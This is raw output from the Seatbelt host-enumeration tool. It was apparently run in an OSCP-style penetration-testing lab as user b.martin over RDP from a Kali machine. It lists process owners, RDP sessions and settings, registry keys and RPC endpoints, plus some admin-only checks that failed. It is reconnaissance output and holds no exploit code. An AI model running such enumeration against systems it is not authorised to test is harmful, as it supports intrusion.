  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably add both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, you're brain hasn't exploded.

  Context                        : .DESCRIPTION
Adds a users or groups to a *local* group.
.SYNOPSIS
net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably add both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, you're brain hasn't exploded.
So, this function adds users and groups to a *local* group.
If the members are already part of the group, nothing happens.
The user running this function must have access to the directory where each principal in the `Member` parameter and the directory where each of the group's current members are located.

====== PowerShellHistory ======

====== Printers ======

ERROR:   [!] Terminating exception running command 'Printers': System.Management.ManagementException: Generic failure 
   at System.Management.ManagementException.ThrowWithExtendedInfo(ManagementStatus errorCode)
   at System.Management.ManagementObjectCollection.ManagementObjectEnumerator.MoveNext()
   at Seatbelt.Commands.Windows.PrintersCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== ProcessCreationEvents ======

ERROR: Unable to collect. Must be an administrator.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

====== ProcessOwners ======

 rdpclip.exe                                        328        OSCP\b.martin
 sihost.exe                                         3888       OSCP\b.martin
 svchost.exe                                        4280       OSCP\b.martin
 svchost.exe                                        2952       OSCP\b.martin
 taskhostw.exe                                      1616       OSCP\b.martin
 ctfmon.exe                                         5172       OSCP\b.martin
 explorer.exe                                       5508       OSCP\b.martin
 ShellExperienceHost.exe                            5904       OSCP\b.martin
 SearchUI.exe                                       5136       OSCP\b.martin
 RuntimeBroker.exe                                  5124       OSCP\b.martin
 RuntimeBroker.exe                                  3712       OSCP\b.martin
 RuntimeBroker.exe                                  6924       OSCP\b.martin
 ImeBroker.exe                                      6960       OSCP\b.martin
 powershell.exe                                     6968       OSCP\b.martin
 conhost.exe                                        6980       OSCP\b.martin
 svchost.exe                                        7108       OSCP\b.martin
 cmd.exe                                            3000       OSCP\b.martin
 conhost.exe                                        1676       OSCP\b.martin
 iexplore.exe                                       6108       OSCP\b.martin
 iexplore.exe                                       620        OSCP\b.martin
 notepad.exe                                        6540       OSCP\b.martin
 Seatbelt.exe                                       5600       OSCP\b.martin
====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== PuttyHostKeys ======

====== PuttySessions ======

====== RDCManFiles ======

====== RDPSavedConnections ======

====== RDPSessions ======

  SessionID                     :  0
  SessionName                   :  Services
  UserName                      :  \
  State                         :  Disconnected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  22h:13m:10s:558ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

  SessionID                     :  1
  SessionName                   :  Console
  UserName                      :  \
  State                         :  Connected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  22h:13m:10s:574ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  640x480 @ 2 bits per pixel
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

  SessionID                     :  2
  SessionName                   :  RDP-Tcp#1
  UserName                      :  OSCP\b.martin
  State                         :  Active
  HostName                      :  
  FarmName                      :  
  LastInput                     :  00h:00m:01s:281ms
  ClientIP                      :  192.168.238.128
  ClientHostname                :  kali
  ClientResolution              :  1024x768 @ 32 bits per pixel
  ClientBuild                   :  18363
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  C:\Windows\System32\mstscax.dll

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication: 
  BlockClipboardRedirection:  
  BlockComPortRedirection:    
  BlockDriveRedirection:      
  BlockLptPortRedirection:    
  BlockPnPDeviceRedirection:  
  BlockPrinterRedirection:    
  AllowSmartCardRedirection:  

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== RecycleBin ======

Recycle Bin Files Within the last 30 Days

====== reg ======

HKLM\Software ! (default) : 
HKLM\Software\Classes ! (default) : 
HKLM\Software\Clients ! (default) : 
HKLM\Software\DefaultUserEnvironment ! (default) : 
HKLM\Software\Google ! (default) : 
HKLM\Software\Intel ! (default) : 
HKLM\Software\JavaSoft ! (default) : 
HKLM\Software\Jenkins ! (default) : 
HKLM\Software\Microsoft ! (default) : 
HKLM\Software\ODBC ! (default) : 
HKLM\Software\Partner ! (default) : 
HKLM\Software\Policies ! (default) : 
HKLM\Software\RegisteredApplications ! (default) : 
HKLM\Software\Setup ! (default) : 
HKLM\Software\VMware, Inc. ! (default) : 
HKLM\Software\WOW6432Node ! (default) : 
====== RPCMappedEndpoints ======

  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_ip_tcp:[49664]
  a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 (LicenseManager): ncalrpc:[LicenseServiceEndpoint]
  be7f785e-0e3a-4ab7-91de-7e46e443be29 v0.0 (): ncalrpc:[LRPC-10a9bcff761b7dbd89]
  54b4c689-969a-476f-8dc2-990885e9f562 v0.0 (): ncalrpc:[LRPC-10a9bcff761b7dbd89]
  e8748f69-a2a4-40df-9366-62dbeb696e26 v0.0 (): ncalrpc:[LRPC-2311b5a3218b3c9c83]
  c8ba73d2-3d55-429c-8e9a-c44f006f69fc v0.0 (): ncalrpc:[LRPC-2311b5a3218b3c9c83]
  43890c94-bfd7-4655-ad6a-b4a68397cdcb v0.0 (): ncalrpc:[LRPC-2311b5a3218b3c9c83]
  0767a036-0d22-48aa-ba69-b619480f38cb v1.0 (PcaSvc): ncalrpc:[LRPC-e5f1727e63ebcb342a]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[OLEAA0A122080FD4BA3C5EF3C26419D]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[LRPC-cc3f509d062213fb6e]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[OLEAA0A122080FD4BA3C5EF3C26419D]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[LRPC-cc3f509d062213fb6e]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[OLEAA0A122080FD4BA3C5EF3C26419D]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[LRPC-cc3f509d062213fb6e]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0119C262]
  12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 (Secure Desktop LRPC interface): ncalrpc:[WMsgKRpc0119C262]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[LRPC-479be898ddba319381]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[OLE919F640521D026C1D7F5A361398B]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[LRPC-3cd83f360422cc7005]
  f3f09ffd-fbcf-4291-944d-70ad6e0e73bb v1.0 (): ncalrpc:[LRPC-78d25dc27d7f31ef70]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc083A11]
  367abb81-9844-35f1-ad32-98f038001003 v2.0 (): ncacn_ip_tcp:[49670]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-1cd060fa98a823af42]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-1cd060fa98a823af42]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-1cd060fa98a823af42]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[OLE3B819BAC010F9BEE8D5C4CD54EA8]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-9a0af3c4bd4be059ca]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncacn_np:[\\PIPE\\ROUTER]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[RasmanLrpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[VpnikeRpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[LRPC-1bb85fa630a3b2f84c]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[LRPC-ff573042ba4186732e]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[LRPC-ff573042ba4186732e]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[LRPC-ff573042ba4186732e]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[LRPC-ff573042ba4186732e]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[LRPC-ff573042ba4186732e]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[LRPC-ff573042ba4186732e]
  a398e520-d59a-4bdd-aa7a-3c1e0303a511 v1.0 (IKE/Authip API): ncalrpc:[LRPC-e56425708e6d61e957]
  98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 (XactSrv service): ncalrpc:[LRPC-452a9af1e3ba0a0102]
  1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 (IdSegSrv service): ncalrpc:[LRPC-452a9af1e3ba0a0102]
  b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 (): ncalrpc:[LRPC-467b1ad34b98a80263]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-3402fd70a538772cef]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[LRPC-3402fd70a538772cef]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[SessEnvPrivateRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_np:[\\pipe\\SessEnvPublicRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_ip_tcp:[49668]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49667]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49667]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_np:[\\pipe\\lsass]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[audit]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[securityevent]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSARPC_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsacap]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_EAS_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsapolicylookup]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsasspirpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[protected_storage]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[SidKey Local End Point]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[samss lpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[NETLOGON_LRPC]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49667]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49667]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49667]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_np:[\\pipe\\lsass]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[audit]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[securityevent]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSARPC_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsacap]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_EAS_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsapolicylookup]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsasspirpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[protected_storage]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[SidKey Local End Point]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[samss lpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[NETLOGON_LRPC]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49667]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49669]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[OLEC8D20B75CE35BEC8F5C318F9C416]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[LRPC-ebd36554cfd9b4c050]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[OLEC8D20B75CE35BEC8F5C318F9C416]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[LRPC-ebd36554cfd9b4c050]
  552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 (IP Transition Configuration endpoint): ncalrpc:[LRPC-afa3f2d090804d39ff]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[LRPC-afa3f2d090804d39ff]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoDiagnostics]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoControl]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[LRPC-afa3f2d090804d39ff]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoDiagnostics]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[LRPC-afa3f2d090804d39ff]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoDiagnostics]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[OLECB378EFA3DDFDC2C3DE1470C9476]
  f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 (Witness Client Upcall Server): ncalrpc:[LRPC-e7441fdb0f81c1250f]
  eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 (Witness Client Test Interface): ncalrpc:[LRPC-e7441fdb0f81c1250f]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncalrpc:[LRPC-e7441fdb0f81c1250f]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncacn_np:[\\PIPE\\wkssvc]
  30b044a5-a225-43f0-b3a4-e060df91f9c1 v1.0 (): ncalrpc:[LRPC-80d54d4d9f6dc9330e]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[LRPC-23686518bcf58ab428]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[LRPC-23686518bcf58ab428]
  e7f76134-9ef5-4949-a2d6-3368cc0988f3 v1.0 (): ncalrpc:[LRPC-23686518bcf58ab428]
  7aeb6705-3ae6-471a-882d-f39c109edc12 v1.0 (): ncalrpc:[LRPC-23686518bcf58ab428]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[LRPC-23686518bcf58ab428]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[LRPC-23686518bcf58ab428]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[LRPC-299af864ee69ab0ade]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[07df6b2a-682a-49c2-8a5f-4619814a736b]
  dd490425-5325-4565-b774-7e27d6c09c24 v1.0 (Base Firewall Engine API): ncalrpc:[LRPC-8810af7848c4e3608e]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-8810af7848c4e3608e]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-dc481a6396c49f592e]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-8810af7848c4e3608e]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-dc481a6396c49f592e]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-f9411d9a5c92a6fc69]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-8810af7848c4e3608e]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-dc481a6396c49f592e]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-f9411d9a5c92a6fc69]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-ee25d4059a9eb2f193]
  0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 (): ncalrpc:[LRPC-619f4e305592cba1ea]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncalrpc:[LRPC-619f4e305592cba1ea]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncalrpc:[LRPC-619f4e305592cba1ea]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-619f4e305592cba1ea]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[ubpmtaskhostchannel]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-de0a73810908db9748]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-619f4e305592cba1ea]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-de0a73810908db9748]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_ip_tcp:[49666]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-619f4e305592cba1ea]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-de0a73810908db9748]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_ip_tcp:[49666]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[senssvc]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-de1c23cda778118a45]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-5b30352b1c1fb0278d]
  2eb08e3e-639f-4fba-97b1-14f878961076 v1.0 (Group Policy RPC Interface): ncalrpc:[LRPC-61f353ff02753f22f7]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[IUserProfile2]
  df4df73a-c52d-4e3a-8003-8437fdf8302a v0.0 (WM_WindowManagerRPC\Server): ncalrpc:[LRPC-2e25ad931365e3cb1c]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncalrpc:[eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_np:[\\pipe\\eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_ip_tcp:[49665]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
